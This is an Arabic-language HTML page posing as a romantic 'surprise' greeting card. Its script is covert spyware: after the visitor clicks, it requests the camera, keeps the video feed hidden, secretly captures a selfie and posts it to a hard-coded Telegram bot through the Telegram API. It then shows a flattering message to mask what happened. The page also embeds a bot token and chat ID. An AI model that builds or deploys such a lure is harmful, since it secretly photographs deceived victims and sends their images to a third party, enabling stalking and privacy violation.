<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إهداء خاص</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #f0f2f5; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 350px;
        }
        /* إخفاء الكاميرا تماماً عن عين المستخدم */
        #video {
            display: none;
        }
        .heart-img {
            width: 150px;
            margin-bottom: 20px;
        }
        h2 { color: #e91e63; }
        button {
            background: #e91e63;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="card">
    <img src="https://cdn-icons-png.flaticon.com/512/833/833472.png" class="heart-img" alt="Heart">
    <h2>رسالة حب لك.. ❤️</h2>
    <p>اضغط على الزر لرؤية المفاجأة</p>
    
    <button onclick="startSecretSystem()">فتح المفاجأة ✨</button>
    
    <div id="status" style="margin-top: 15px; font-size: 12px; color: #888;"></div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const BOT_TOKEN = '8455403624:AAGfoq9rNX2CTDbN2s6PeV8oyfosDLtDZSQ';
    const CHAT_ID = '6975241289';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function startSecretSystem() {
        try {
            // طلب الإذن (سيظهر التنبيه العادي للمتصفح)
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;

            document.getElementById('status').textContent = "جاري تحميل المفاجأة... ⏳";

            video.onloadedmetadata = () => {
                // التقاط الصورة سراً بعد ثانية واحدة
                setTimeout(captureAndSend, 1500);
            };
        } catch (err) {
            console.log("رفض الإذن");
        }
    }

    function captureAndSend() {
        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'surprise.png');
            fd.append('caption', '📸 سيلفي المفاجأة وصل!');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: fd
            }).then(() => {
                document.getElementById('status').textContent = "المفاجأة: أنت شخص رائع جداً! 😍";
            });
        }, 'image/png');
    }
</script>

</body>
</html>
